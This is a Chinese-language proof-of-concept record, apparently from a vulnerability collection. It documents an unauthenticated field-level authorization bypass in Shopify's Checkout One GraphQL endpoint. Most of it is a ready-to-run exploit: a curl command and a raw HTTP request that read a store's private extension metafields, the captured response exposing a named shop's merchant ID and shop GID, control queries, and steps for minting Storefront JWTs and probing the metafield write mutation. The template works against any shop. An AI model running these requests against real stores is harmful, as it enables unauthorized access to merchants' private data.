# Shopify Checkout One GraphQL Query.extensionMetafields 零凭据读取店铺私有 metafields

- **code**: shopify-checkout-one-graphql-query.extensionmetafields-零凭据读取
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Checkout One GraphQL
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测：无 Cookie/无 x-checkout-one-session-token/无 build-id 的 POST /checkouts/unstable/graphql 查询 {extensionMetafields{namespace key value ownerId ownerType}} 返回 HTTP 200 与该店私有 metafield（mm_google_shopping_extension/merchant_id=5823002905, ownerId=gid://shopify/Shop/103967621452）；/checkouts/graphql 稳定版同样返回；同端点 session/shop 返回 INVALID_SESSION_TOKEN 作阴性对照；公开 Storefront API 读取同一字段返回 ACCESS_DENIED。记录代理 traffic id 1794432594-3153。
- **path**: pocs/shopify-checkout-one-graphql-query.extensionmetafields-零凭据读取/poc.http
- **tags**: shopify,checkout-one,graphql,unauthorized,field-level-auth-bypass,metafields,info-leak
- **created_at**: 2026-11-11T21:31:25.346Z
- **engine**: https://retro-refresh.com/checkouts/unstable/graphql

## 描述

Shopify 托管店的 Checkout One GraphQL（/checkouts/unstable/graphql 与 /checkouts/graphql）对 Query.extensionMetafields 存在字段级鉴权豁免：匿名（无 Cookie、无 x-checkout-one-session-token、无 build-id）即可读取店铺全部 checkout 扩展私有 metafields（含 ownerId/ownerType）。同端点 session/shop/embed 等字段仍强制会话。写入 mutation writeAppMetafields 需会话（Invalid session），extensionApiTokens 可零凭据铸 Storefront JWT 但对该店 /api/graphql 为 401 UNAUTHORIZED，故上限为信息泄露。

## 用法

```
探测脚本（间隔 ≥2.5s）：
1) curl -sS -X POST 'https://<shop>/checkouts/unstable/graphql' -H 'Content-Type: application/json' --data '{"query":"{extensionMetafields{namespace key value ownerId ownerType}}"}'
2) 对照：同端点 {"query":"{session{__typename}}"} 应返回 INVALID_SESSION_TOKEN
3) 非公开对照：/api/2026-04/graphql.json 读同 namespace/key 应返回 ACCESS_DENIED（unauthenticated_read_metafields）
若 1) 有数据而 2) 报会话错误、3) 被拒 → 字段级鉴权豁免成立。可进一步测试 writeAppMetafields（需会话）与 extensionApiTokens（铸 JWT 后测试可用性）。
```

## 正文

```
适用：Shopify 托管店（Checkout One API）。

请求：
POST /checkouts/unstable/graphql HTTP/2
Host: <shop>
Content-Type: application/json

{"query":"{extensionMetafields{namespace key value ownerId ownerType}}"}

实测响应（retro-refresh.com）：
HTTP 200
{"data":{"extensionMetafields":[{"namespace":"mm_google_shopping_extension","key":"merchant_id","value":"5823002905","ownerId":"gid://shopify/Shop/103967621452","ownerType":"SHOP"}]}}

阴性对照：
- {"query":"{session{__typename}}"} → {"errors":[{"message":"Invalid session token.","extensions":{"code":"INVALID_SESSION_TOKEN"},"path":["session"]}]}
- {"query":"{shop{id}}"} → INVALID_SESSION_TOKEN
- POST /api/2026-04/graphql.json {"query":"{shop{metafields(identifiers:[...]){...}}}"} → ACCESS_DENIED（需要 unauthenticated_read_metafields）

边界：
- mutation writeAppMetafields(operation:SET, ...) → errors:[{"message":"Invalid session"}]
- extensionApiTokens(appId:"gid://shopify/App/<id>"){storefrontApi{token}} → 铸出 HS256 JWT（iss=shopify, sub/cid=<appId>, sid=<shopId>），以 X-Shopify-Storefront-Access-Token 或 Bearer 打 /api/graphql 均 401 UNAUTHORIZED
- checkoutExtensionSessionToken 无 registrationUuid 时返回 null
- receipt(receiptId) 需真实 GID，猜解返回 RESOURCE_NOT_FOUND

性质：字段级鉴权豁免，非端点整体开放；泄露值不含 PII/密钥，属信息泄露。
```
